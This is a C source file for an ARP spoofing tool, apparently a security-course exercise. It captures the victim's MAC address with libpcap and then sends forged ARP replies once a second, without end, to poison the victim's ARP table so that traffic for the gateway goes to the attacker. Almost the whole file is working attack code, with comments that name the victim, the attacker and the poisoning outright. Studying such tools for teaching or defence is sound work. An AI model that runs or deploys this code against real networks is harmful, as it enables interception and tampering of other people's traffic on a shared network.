/*======================================================================*/
/* Program Description */
/* 
 * Fake sender(=victim)'s ARP table by sending arp packets
 * sender ip == victim ip
 * target ip usually set as gateway ip
 * 
 * Send user defined buffer as packet, using pcap_sendpacket()
 * Find attacker(=you)'s MAC information (@google)
 * 
 * Three entities: attacker, victim, gateway
 * 
 * 1. Find attacker IP address
 * 2. Find attacker MAC address
 * 3. Send ARP request and receive ARP reply to identify target MAC address
 * 4. Send ARP reply to target
 *
 * Copyright © 2018 James Sung. All rights reserved.
 */
/*======================================================================*/


#include "functions.h"

// ./send_arp <interface> <sender ip> <target ip>
int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}
	
	printf("[+] Running program...\n\n");
	
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	struct in_addr *target_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t        target_IP_int;

	inet_aton(argv[3], target_IP_struct);
	target_IP_int = target_IP_struct->s_addr;
	
/* get attacker ip address */
	int n;
	struct ifreq ifr;
 
	n = socket(AF_INET, SOCK_DGRAM, 0);
	
	//Type of address to retrieve - IPv4 IP address
	ifr.ifr_addr.sa_family = AF_INET;
	
	//Copy the interface name in the ifreq structure
	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
	ioctl(n, SIOCGIFADDR, &ifr);
	close(n);
	
	char            attacker_IP_char[16];
	struct in_addr *attacker_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t        attacker_IP_int;

	strcpy(attacker_IP_char, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	//display result
	printf("[Attacker IP  Address] %s\n", attacker_IP_char);
	
	inet_aton(attacker_IP_char, attacker_IP_struct);
	attacker_IP_int = attacker_IP_struct->s_addr;
	//printf("%08x\n", attacker_IP_int);

/* get attacker mac address */
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	uint8_t *attacker_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	strcpy(s.ifr_name, dev);
	if (!ioctl(fd, SIOCGIFHWADDR, &s))
	{
		printf("[Attacker MAC Address] ");
		for (int i = 0; i < 6; i++)
		{
			//printf(" %02x", (unsigned char) s.ifr_addr.sa_data[i]);
			attacker_MAC_array[i] = s.ifr_addr.sa_data[i];
			if(i) { printf(":"); }
			printf("%02x", (unsigned char) attacker_MAC_array[i]);
		}
		puts("");
	}
	puts("");

/* send arp request broadcast */
	my_etharp_hdr *arp_request = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	my_etharp_hdr *arp_reply   = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));

	struct in_addr *sender_IP_struct = (struct in_addr *)calloc(1, sizeof(struct in_addr));
	uint32_t        sender_IP_int;

	uint8_t *sender_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	printf("[Sender   IP  Address] %s\n", argv[2]);

	inet_aton(argv[2], sender_IP_struct);

	sender_IP_int = sender_IP_struct->s_addr;


	printf("[+] Creating ARP request packet: ");

	memset(arp_request->DMAC, 0xFF, 6 * sizeof(uint8_t));
	memcpy(arp_request->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
	arp_request->ETHTYPE = htons(ETHERTYPE_ARP);

/*
	(arp_request->ARPHDR).HTYPE = ARP_HTYPE_ETH;
	(arp_request->ARPHDR).PTYPE = ARP_PTYPE_IP;
	(arp_request->ARPHDR).HLEN  = ARP_HLEN_ETH;
	(arp_request->ARPHDR).PLEN  = ARP_PLEN_IP;
	(arp_request->ARPHDR).OPER  = ARP_OPER_RQ;
*/
	/* Set packet contents */
	(arp_request->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
	(arp_request->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
	(arp_request->ARPHDR).HLEN  = ARP_HLEN_ETH;
	(arp_request->ARPHDR).PLEN  = ARP_PLEN_IP;
	(arp_request->ARPHDR).OPER  = htons(ARPOP_REQUEST);
	//for (int i = 0; i < 6; i++) { (arp_request->ARPHDR).SHA[i] = attacker_MAC_array[i]; }
	memcpy((arp_request->ARPHDR).SHA, attacker_MAC_array, 6 * sizeof(uint8_t));
	(arp_request->ARPHDR).SPA   = attacker_IP_int;
	//for (int i = 0; i < 6; i++) { (arp_request->ARPHDR).THA[i] = 0x00; }
	memset((arp_request->ARPHDR).THA, 0x00, 6 * sizeof(uint8_t));
	(arp_request->ARPHDR).TPA   = sender_IP_int;
	printf("Done\n");

/*	
	printf("[DMAC] "); for (int i = 0; i < 6; i++) { printf("%02x ", arp_request->DMAC[i]); }; puts("");
	printf("[SMAC] "); for (int i = 0; i < 6; i++) { printf("%02x ", arp_request->SMAC[i]); }; puts("");
	printf("[ETYP] "); printf("%04x", arp_request->ETHTYPE); puts("");

	printf("[HTYP] "); printf("%04x", (arp_request->ARPHDR).HTYPE); puts("");
	printf("[PTYP] "); printf("%04x", (arp_request->ARPHDR).PTYPE); puts("");
	
	printf("[HLEN] "); printf("%02x", (arp_request->ARPHDR).HLEN); puts("");
	printf("[PLEN] "); printf("%02x", (arp_request->ARPHDR).PLEN); puts("");
	printf("[OPER] "); printf("%02x", (arp_request->ARPHDR).OPER); puts("");
	printf("[SHWA] "); for (int i = 0; i < 6; i++) { printf("%02x ", (arp_request->ARPHDR).SHA[i]); } puts("");
	printf("[SPRA] "); printf("%08x", (arp_request->ARPHDR).SPA); puts("");
	printf("[THWA] "); for (int i = 0; i < 6; i++) { printf("%02x ", (arp_request->ARPHDR).THA[i]); } puts("");
	printf("[TPRA] "); printf("%08x", (arp_request->ARPHDR).TPA); puts("");
	puts("");
*/
	struct pcap_pkthdr  *header = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	uint8_t             *arp_request_packet = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));
	const uint8_t       *packet;
	
	memcpy(arp_request_packet, arp_request, sizeof(my_etharp_hdr));

	printf("[+] Broadcasting ARP request: ");
	if (pcap_sendpacket(handle, arp_request_packet, sizeof(my_etharp_hdr)))
	{
		printf("Failed!\n");
		printf("[-] Failed to send packet\n");
		printf("[*] Exiting program with error code -1\n");
		pcap_perror(handle, 0);	
		return -1;
	}
	printf("Done\n");

	printf("[+] Getting sender MAC address from ARP reply packet: ");
	while (1)
	{
		int res = pcap_next_ex(handle, &header, &packet);
	
		if (res == 0)               continue;
		if (res == -1 || res == -2) break;

		uint8_t  ETH_HL         = 14;
		uint16_t PCKT_ETHERTYPE = (packet[12] << 8) | packet[13];

		if (PCKT_ETHERTYPE != ETHERTYPE_ARP) { continue; }

		uint16_t PCKT_ARPOP = (packet[20] << 8) | packet[21];

		if (PCKT_ARPOP != ARPOP_REPLY) { continue; }
		
		// compute regarding little-endian
		uint32_t PCKT_ARPSPA = (packet[31] << 24) | (packet[30] << 16) | (packet[29] << 8) | (packet[28]);
		
		if (PCKT_ARPSPA != sender_IP_int) { continue; }

		memcpy(sender_MAC_array, (packet + 22), 6 * sizeof(uint8_t));

		printf("Done\n");
		printf("[Sender   MAC Address] ");
		for (int i = 0; i < 6; i++)
		{ if (i) printf(":"); printf("%02x", sender_MAC_array[i]); }
		
		puts("");

		break;
	}

	uint8_t *arp_reply_packet = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));

	
	printf("[+] Creating fake ARP reply packet: ");

	memcpy(arp_reply->DMAC, sender_MAC_array, 6 * sizeof(uint8_t));
	memcpy(arp_reply->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
	arp_reply->ETHTYPE = htons(ETHERTYPE_ARP);

	/* Set packet contents */
	(arp_reply->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
	(arp_reply->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
	(arp_reply->ARPHDR).HLEN  = ARP_HLEN_ETH;
	(arp_reply->ARPHDR).PLEN  = ARP_PLEN_IP;
	(arp_reply->ARPHDR).OPER  = htons(ARPOP_REPLY);
	memcpy((arp_reply->ARPHDR).SHA, attacker_MAC_array, 6 * sizeof(uint8_t));
	(arp_reply->ARPHDR).SPA   = target_IP_int;
	memcpy((arp_reply->ARPHDR).THA, sender_MAC_array, 6 * sizeof(uint8_t));
	(arp_reply->ARPHDR).TPA   = sender_IP_int;
	printf("Done\n");
	
	memcpy(arp_reply_packet, arp_reply, sizeof(my_etharp_hdr));

	printf("[+] Sending fake ARP reply to sender: sender ARP table will be poisoned...\n\n");
	while (1)
	{
		pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
		sleep(1);
	}

	return 0;
}





